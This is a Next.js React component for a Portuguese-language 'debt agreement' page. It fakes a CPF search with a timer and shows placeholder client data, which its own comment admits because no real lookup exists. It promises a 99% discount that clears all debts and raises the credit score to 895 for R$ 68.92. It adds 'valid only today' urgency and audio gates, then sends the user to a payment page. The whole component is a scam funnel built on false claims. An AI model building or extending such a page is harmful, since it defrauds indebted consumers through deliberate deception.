'use client'

import { useEffect, useRef, useState } from 'react'
import { useRouter } from 'next/navigation'
import { Pause, Play } from 'lucide-react'

// Dados genéricos exibidos ao lead (não temos API de CPF).
const NOME_CLIENTE = 'CLIENTE'
const CPF_CLIENTE = '000.000.000-00'

function formatTime(segundos: number) {
  if (!Number.isFinite(segundos) || segundos < 0) segundos = 0
  const min = Math.floor(segundos / 60)
  const seg = Math.floor(segundos % 60)
  return `${min}:${seg.toString().padStart(2, '0')}`
}

const CODIGO_ACORDO = 'X1EX4-1XO--'

export default function AcordoClient() {
  const router = useRouter()
  const [encontrado, setEncontrado] = useState(false)
  const [mostrarPlayer, setMostrarPlayer] = useState(false)
  const [tocando, setTocando] = useState(false)
  const [tempoAtual, setTempoAtual] = useState(0)
  const [duracao, setDuracao] = useState(0)
  const [audioTerminou, setAudioTerminou] = useState(false)
  const [mensagensVisiveis, setMensagensVisiveis] = useState(0)
  const [confirmou, setConfirmou] = useState(false)
  const audioRef = useRef<HTMLAudioElement>(null)

  // Player das instruções finais (segundo áudio).
  const [mostrarPlayerFinal, setMostrarPlayerFinal] = useState(false)
  const [tocandoFinal, setTocandoFinal] = useState(false)
  const [tempoAtualFinal, setTempoAtualFinal] = useState(0)
  const [duracaoFinal, setDuracaoFinal] = useState(0)
  const [instrucoesTerminou, setInstrucoesTerminou] = useState(false)
  const audioFinalRef = useRef<HTMLAudioElement>(null)

  // Etapas finais após as instruções.
  const [acordoConfirmado, setAcordoConfirmado] = useState(false)
  const [mostrarBotaoMensagemFinal, setMostrarBotaoMensagemFinal] = useState(false)
  const [mostrarPlayerPagamento, setMostrarPlayerPagamento] = useState(false)

  // Player da mensagem final (terceiro áudio - pagamento).
  const [tocandoPagamento, setTocandoPagamento] = useState(false)
  const [tempoAtualPagamento, setTempoAtualPagamento] = useState(0)
  const [duracaoPagamento, setDuracaoPagamento] = useState(0)
  const [pagamentoTerminou, setPagamentoTerminou] = useState(false)
  const audioPagamentoRef = useRef<HTMLAudioElement>(null)

  // Detalhes do acordo e orientações de pagamento.
  const [mostrarDetalhes, setMostrarDetalhes] = useState(false)
  const [mostrarOrientacoes, setMostrarOrientacoes] = useState(false)
  const [mostrarPlayerAviso, setMostrarPlayerAviso] = useState(false)

  // Player das orientações de pagamento (quarto áudio - aviso).
  const [tocandoAviso, setTocandoAviso] = useState(false)
  const [tempoAtualAviso, setTempoAtualAviso] = useState(0)
  const [duracaoAviso, setDuracaoAviso] = useState(0)
  const [avisoTerminou, setAvisoTerminou] = useState(false)
  const audioAvisoRef = useRef<HTMLAudioElement>(null)

  // Simula a verificação de acordos antes de revelar o resultado.
  useEffect(() => {
    const t = window.setTimeout(() => setEncontrado(true), 3000)
    return () => window.clearTimeout(t)
  }, [])

  // Revela a sequência de mensagens de forma escalonada.
  const iniciarMensagens = () => {
    if (mensagensVisiveis > 0) return
    const totalMensagens = 6
    for (let i = 1; i <= totalMensagens; i++) {
      window.setTimeout(() => setMensagensVisiveis(i), i * 1200)
    }
  }

  const alternarPlay = () => {
    const audio = audioRef.current
    if (!audio) return
    if (audio.paused) {
      audio.play().catch(() => {})
    } else {
      audio.pause()
    }
  }

  const alternarPlayFinal = () => {
    const audio = audioFinalRef.current
    if (!audio) return
    if (audio.paused) {
      audio.play().catch(() => {})
    } else {
      audio.pause()
    }
  }

  const alternarPlayPagamento = () => {
    const audio = audioPagamentoRef.current
    if (!audio) return
    if (audio.paused) {
      audio.play().catch(() => {})
    } else {
      audio.pause()
    }
  }

  const alternarPlayAviso = () => {
    const audio = audioAvisoRef.current
    if (!audio) return
    if (audio.paused) {
      audio.play().catch(() => {})
    } else {
      audio.pause()
    }
  }

  const progresso = duracao > 0 ? (tempoAtual / duracao) * 100 : 0
  const progressoFinal = duracaoFinal > 0 ? (tempoAtualFinal / duracaoFinal) * 100 : 0
  const progressoPagamento = duracaoPagamento > 0 ? (tempoAtualPagamento / duracaoPagamento) * 100 : 0
  const progressoAviso = duracaoAviso > 0 ? (tempoAtualAviso / duracaoAviso) * 100 : 0

  return (
    <section aria-label="Verificação de acordo" className="w-full max-w-[640px] space-y-4">
      <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-5">
        <p className="text-sm italic leading-relaxed text-gray-700 sm:text-base">
          Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para você...
        </p>
      </div>

      {encontrado && (
        <>
          <div className="w-fit max-w-full rounded-full border border-gray-100 bg-white px-4 py-2.5 shadow-sm sm:px-6 sm:py-3.5">
            <p className="text-sm font-bold text-gray-900 sm:text-base">Acordo encontrado!</p>
          </div>

          <div className="w-full rounded-2xl border border-blue-100 bg-blue-50 px-4 py-4 shadow-sm sm:px-6 sm:py-5">
            <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
              <span className="font-bold text-gray-900">1 (um)</span> acordo foi encontrado para:
            </p>
            <p className="mt-3 text-base font-bold text-[#1e40af] sm:text-lg">{NOME_CLIENTE}</p>
            <p className="mt-1 text-base font-bold text-[#1e40af] sm:text-lg">CPF: {CPF_CLIENTE}</p>
          </div>

          {!mostrarPlayer ? (
            <button
              type="button"
              onClick={() => setMostrarPlayer(true)}
              className="block w-full rounded-full bg-[#1e40af] px-5 py-3 text-center text-sm font-bold text-white transition-colors hover:bg-[#1a3696] sm:px-6 sm:py-3.5 sm:text-base"
            >
              VER ACORDO
            </button>
          ) : (
            <section
              aria-label="Áudio do acordo"
              className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-5 shadow-sm sm:px-6 sm:py-6"
            >
              <audio
                ref={audioRef}
                src="/assets/buscaacordo.mp3"
                preload="auto"
                onPlay={() => setTocando(true)}
                onPause={() => setTocando(false)}
                onLoadedMetadata={(e) => setDuracao(e.currentTarget.duration)}
                onTimeUpdate={(e) => setTempoAtual(e.currentTarget.currentTime)}
                onEnded={() => {
                  setTocando(false)
                  setAudioTerminou(true)
                }}
              />

              <div className="flex items-center gap-4">
                <button
                  type="button"
                  onClick={alternarPlay}
                  aria-label={tocando ? 'Pausar áudio' : 'Reproduzir áudio'}
                  className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-[#1e40af] text-white transition-colors hover:bg-[#1a3696]"
                >
                  {tocando ? (
                    <Pause className="h-6 w-6" fill="currentColor" />
                  ) : (
                    <Play className="ml-0.5 h-6 w-6" fill="currentColor" />
                  )}
                </button>

                <div className="flex-1">
                  <div className="h-2 w-full overflow-hidden rounded-full bg-gray-200">
                    <div
                      className="h-full rounded-full bg-[#1e40af] transition-[width]"
                      style={{ width: `${progresso}%` }}
                    />
                  </div>
                  <div className="mt-2 flex items-center justify-between text-xs text-gray-500 sm:text-sm">
                    <span>{formatTime(tempoAtual)}</span>
                    <span>{formatTime(duracao)}</span>
                  </div>
                </div>
              </div>

              {audioTerminou ? (
                <button
                  type="button"
                  onClick={iniciarMensagens}
                  disabled={mensagensVisiveis > 0}
                  className="mt-5 w-full rounded-full bg-[#1e40af] py-3.5 text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] disabled:opacity-60 sm:py-4 sm:text-base"
                >
                  Sim, quero realizar o acordo
                </button>
              ) : (
                <p className="mt-4 text-center text-sm text-gray-400">Ouça o áudio completo para continuar</p>
              )}
            </section>
          )}

          {mensagensVisiveis >= 1 && (
            <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
              <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
                Parabéns <span className="font-bold text-gray-900">{NOME_CLIENTE}</span>!
              </p>
            </div>
          )}

          {mensagensVisiveis >= 2 && (
            <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
              <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
                Pode comemorar! Encontramos um{' '}
                <span className="font-bold text-gray-900">SUPER ACORDO DE 99% DE DESCONTO</span> para você!
              </p>
            </div>
          )}

          {mensagensVisiveis >= 3 && (
            <div className="w-fit max-w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
              <p className="text-sm italic leading-relaxed text-gray-700 sm:text-base">
                Acessando o acordo {CODIGO_ACORDO}...
              </p>
            </div>
          )}

          {mensagensVisiveis >= 4 && (
            <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
              <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
                Informações do acordo <span className="font-bold italic text-gray-900">{CODIGO_ACORDO}</span> para ({' '}
                <span className="font-bold text-gray-900">{NOME_CLIENTE}</span>)
              </p>
              <p className="text-sm leading-relaxed text-gray-700 sm:text-base">(CPF: {CPF_CLIENTE})</p>
            </div>
          )}

          {mensagensVisiveis >= 5 && (
            <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
              <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
                O contrato atual é válido apenas para o titular:{' '}
                <span className="font-bold text-gray-900">{NOME_CLIENTE}</span> portador(a) do CPF:{' '}
                <span className="font-bold text-gray-900">{CPF_CLIENTE}</span>
              </p>
            </div>
          )}

          {mensagensVisiveis >= 6 && (
            <>
              <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
                <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
                  Você gostaria de realizar o seu acordo com{' '}
                  <span className="font-bold text-gray-900">99% DE DESCONTO</span> para quitar{' '}
                  <span className="font-bold text-gray-900">todas</span> as suas dívidas e ter seu nome limpo novamente
                  por apenas <span className="font-bold text-gray-900">R$ 68,92</span>?
                </p>
              </div>

              {!confirmou && (
                <button
                  type="button"
                  onClick={() => setConfirmou(true)}
                  className="block w-full rounded-full bg-[#1e40af] px-5 py-3.5 text-center text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] sm:py-4 sm:text-base"
                >
                  Confirmar o acordo e limpar o nome
                </button>
              )}
            </>
          )}

          {confirmou && (
            <>
              <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
                <p className="text-sm font-bold leading-relaxed text-gray-900 sm:text-base">
                  Processando confirmação... Ouça as instruções finais:
                </p>
              </div>

              {!mostrarPlayerFinal ? (
                <button
                  type="button"
                  onClick={() => setMostrarPlayerFinal(true)}
                  className="block w-full rounded-full bg-[#1e40af] px-5 py-3.5 text-center text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] sm:py-4 sm:text-base"
                >
                  Ouvir instruções finais
                </button>
              ) : (
                <section
                  aria-label="Áudio das instruções finais"
                  className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-5 shadow-sm sm:px-6 sm:py-6"
                >
                  <audio
                    ref={audioFinalRef}
                    src="/assets/instrucoes-finais.mp3"
                    preload="auto"
                    onPlay={() => setTocandoFinal(true)}
                    onPause={() => setTocandoFinal(false)}
                    onLoadedMetadata={(e) => setDuracaoFinal(e.currentTarget.duration)}
                    onTimeUpdate={(e) => setTempoAtualFinal(e.currentTarget.currentTime)}
                    onEnded={() => {
                      setTocandoFinal(false)
                      setInstrucoesTerminou(true)
                    }}
                  />

                  <div className="flex items-center gap-4">
                    <button
                      type="button"
                      onClick={alternarPlayFinal}
                      aria-label={tocandoFinal ? 'Pausar áudio' : 'Reproduzir áudio'}
                      className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-[#1e40af] text-white transition-colors hover:bg-[#1a3696]"
                    >
                      {tocandoFinal ? (
                        <Pause className="h-6 w-6" fill="currentColor" />
                      ) : (
                        <Play className="ml-0.5 h-6 w-6" fill="currentColor" />
                      )}
                    </button>

                    <div className="flex-1">
                      <div className="h-2 w-full overflow-hidden rounded-full bg-gray-200">
                        <div
                          className="h-full rounded-full bg-[#1e40af] transition-[width]"
                          style={{ width: `${progressoFinal}%` }}
                        />
                      </div>
                      <div className="mt-2 flex items-center justify-between text-xs text-gray-500 sm:text-sm">
                        <span>{formatTime(tempoAtualFinal)}</span>
                        <span>{formatTime(duracaoFinal)}</span>
                      </div>
                    </div>
                  </div>

                  {instrucoesTerminou ? (
                    <button
                      type="button"
                      onClick={() => setAcordoConfirmado(true)}
                      disabled={acordoConfirmado}
                      className="mt-5 w-full rounded-full bg-[#1e40af] py-3.5 text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] disabled:opacity-60 sm:py-4 sm:text-base"
                    >
                      Continuar
                    </button>
                  ) : (
                    <p className="mt-4 text-center text-sm text-gray-400">Ouça o áudio completo para continuar</p>
                  )}
                </section>
              )}

              {acordoConfirmado && (
                <div className="flex flex-col gap-4">
                  <div className="w-fit max-w-full rounded-full border border-gray-100 bg-white px-4 py-2.5 shadow-sm sm:px-6 sm:py-3.5">
                    <p className="text-sm font-bold text-gray-900 sm:text-base">Acordo confirmado com sucesso!</p>
                  </div>

                  {!mostrarBotaoMensagemFinal && (
                    <button
                      type="button"
                      onClick={() => setMostrarBotaoMensagemFinal(true)}
                      className="self-end rounded-full bg-[#1e40af] px-8 py-3 text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] sm:text-base"
                    >
                      Continuar
                    </button>
                  )}
                </div>
              )}

              {mostrarBotaoMensagemFinal && !mostrarPlayerPagamento && (
                <button
                  type="button"
                  onClick={() => setMostrarPlayerPagamento(true)}
                  className="block w-full rounded-full bg-[#1e40af] px-5 py-3.5 text-center text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] sm:py-4 sm:text-base"
                >
                  Ouvir mensagem final
                </button>
              )}

              {mostrarPlayerPagamento && (
                <section
                  aria-label="Áudio da mensagem final"
                  className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-5 shadow-sm sm:px-6 sm:py-6"
                >
                  <audio
                    ref={audioPagamentoRef}
                    src="/assets/pagamento.mp3"
                    preload="auto"
                    onPlay={() => setTocandoPagamento(true)}
                    onPause={() => setTocandoPagamento(false)}
                    onLoadedMetadata={(e) => setDuracaoPagamento(e.currentTarget.duration)}
                    onTimeUpdate={(e) => setTempoAtualPagamento(e.currentTarget.currentTime)}
                    onEnded={() => {
                      setTocandoPagamento(false)
                      setPagamentoTerminou(true)
                    }}
                  />

                  <div className="flex items-center gap-4">
                    <button
                      type="button"
                      onClick={alternarPlayPagamento}
                      aria-label={tocandoPagamento ? 'Pausar áudio' : 'Reproduzir áudio'}
                      className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-[#1e40af] text-white transition-colors hover:bg-[#1a3696]"
                    >
                      {tocandoPagamento ? (
                        <Pause className="h-6 w-6" fill="currentColor" />
                      ) : (
                        <Play className="ml-0.5 h-6 w-6" fill="currentColor" />
                      )}
                    </button>

                    <div className="flex-1">
                      <div className="h-2 w-full overflow-hidden rounded-full bg-gray-200">
                        <div
                          className="h-full rounded-full bg-[#1e40af] transition-[width]"
                          style={{ width: `${progressoPagamento}%` }}
                        />
                      </div>
                      <div className="mt-2 flex items-center justify-between text-xs text-gray-500 sm:text-sm">
                        <span>{formatTime(tempoAtualPagamento)}</span>
                        <span>{formatTime(duracaoPagamento)}</span>
                      </div>
                    </div>
                  </div>

                  {pagamentoTerminou ? (
                    <button
                      type="button"
                      onClick={() => setMostrarDetalhes(true)}
                      disabled={mostrarDetalhes}
                      className="mt-5 w-full rounded-full bg-[#1e40af] py-3.5 text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] disabled:opacity-60 sm:py-4 sm:text-base"
                    >
                      Ver detalhes do acordo
                    </button>
                  ) : (
                    <p className="mt-4 text-center text-sm text-gray-400">Ouça o áudio completo para continuar</p>
                  )}
                </section>
              )}

              {mostrarDetalhes && (
                <>
                  <div className="w-full rounded-2xl border border-blue-100 bg-blue-50 px-4 py-4 shadow-sm sm:px-6 sm:py-5">
                    <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
                      Acordo confirmado: {CODIGO_ACORDO}!
                    </p>
                    <p className="mt-3 text-sm leading-relaxed text-gray-700 sm:text-base">Beneficiário(a):</p>
                    <p className="text-sm font-bold text-gray-900 sm:text-base">{NOME_CLIENTE}</p>
                    <p className="mt-3 text-sm leading-relaxed text-gray-700 sm:text-base">Identificação (CPF):</p>
                    <p className="text-sm font-bold text-gray-900 sm:text-base">{CPF_CLIENTE}</p>
                    <p className="mt-3 text-sm leading-relaxed text-[#1e40af] sm:text-base">
                      Quitação de todas as dívidas em ativo no CPF.
                    </p>
                    <p className="mt-1 text-sm font-bold text-gray-900 sm:text-base">895 Pontos no score.</p>
                    <p className="mt-1 text-sm leading-relaxed text-gray-700 sm:text-base">
                      Valor da proposta: R$ 68,92
                    </p>
                  </div>

                  {!mostrarOrientacoes && (
                    <button
                      type="button"
                      onClick={() => setMostrarOrientacoes(true)}
                      className="self-end rounded-full bg-[#1e40af] px-8 py-3 text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] sm:text-base"
                    >
                      Continuar para o pagamento
                    </button>
                  )}
                </>
              )}

              {mostrarOrientacoes && (
                <>
                  <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
                    <p className="text-sm font-bold leading-relaxed text-gray-900 sm:text-base">
                      Antes de prosseguir para o pagamento, ouça as orientações finais:
                    </p>
                  </div>

                  {!mostrarPlayerAviso ? (
                    <button
                      type="button"
                      onClick={() => setMostrarPlayerAviso(true)}
                      className="block w-full rounded-full bg-[#1e40af] px-5 py-3.5 text-center text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] sm:py-4 sm:text-base"
                    >
                      Ouvir instruções de pagamento
                    </button>
                  ) : (
                    <section
                      aria-label="Áudio das orientações de pagamento"
                      className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-5 shadow-sm sm:px-6 sm:py-6"
                    >
                      <audio
                        ref={audioAvisoRef}
                        src="/assets/aviso.mp3"
                        preload="auto"
                        onPlay={() => setTocandoAviso(true)}
                        onPause={() => setTocandoAviso(false)}
                        onLoadedMetadata={(e) => setDuracaoAviso(e.currentTarget.duration)}
                        onTimeUpdate={(e) => setTempoAtualAviso(e.currentTarget.currentTime)}
                        onEnded={() => {
                          setTocandoAviso(false)
                          setAvisoTerminou(true)
                        }}
                      />

                      <div className="flex items-center gap-4">
                        <button
                          type="button"
                          onClick={alternarPlayAviso}
                          aria-label={tocandoAviso ? 'Pausar áudio' : 'Reproduzir áudio'}
                          className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-[#1e40af] text-white transition-colors hover:bg-[#1a3696]"
                        >
                          {tocandoAviso ? (
                            <Pause className="h-6 w-6" fill="currentColor" />
                          ) : (
                            <Play className="ml-0.5 h-6 w-6" fill="currentColor" />
                          )}
                        </button>

                        <div className="flex-1">
                          <div className="h-2 w-full overflow-hidden rounded-full bg-gray-200">
                            <div
                              className="h-full rounded-full bg-[#1e40af] transition-[width]"
                              style={{ width: `${progressoAviso}%` }}
                            />
                          </div>
                          <div className="mt-2 flex items-center justify-between text-xs text-gray-500 sm:text-sm">
                            <span>{formatTime(tempoAtualAviso)}</span>
                            <span>{formatTime(duracaoAviso)}</span>
                          </div>
                        </div>
                      </div>

                      {!avisoTerminou && (
                        <p className="mt-4 text-center text-sm text-gray-400">Ouça o áudio completo para continuar</p>
                      )}
                    </section>
                  )}
                </>
              )}

              {avisoTerminou && (
                <>
                  <div className="w-fit max-w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
                    <p className="text-sm leading-relaxed text-gray-700 sm:text-base">
                      <span className="font-bold italic text-gray-900">Atenção!</span> Oferta Válida Apenas para hoje.
                    </p>
                  </div>

                  <div className="w-full rounded-2xl border border-gray-100 bg-white px-4 py-3.5 shadow-sm sm:px-6 sm:py-4">
                    <p className="text-sm italic leading-relaxed text-gray-700 sm:text-base">
                      Clique no botão abaixo para acessar a próxima tela e realizar seu pagamento
                    </p>
                  </div>

                  <button
                    type="button"
                    onClick={() => router.push('/pagamento')}
                    className="block w-full rounded-full bg-[#1e40af] px-5 py-3.5 text-center text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#1a3696] sm:py-4 sm:text-base"
                  >
                    Realizar pagamento do acordo e limpar meu nome
                  </button>
                </>
              )}
            </>
          )}
        </>
      )}
    </section>
  )
}
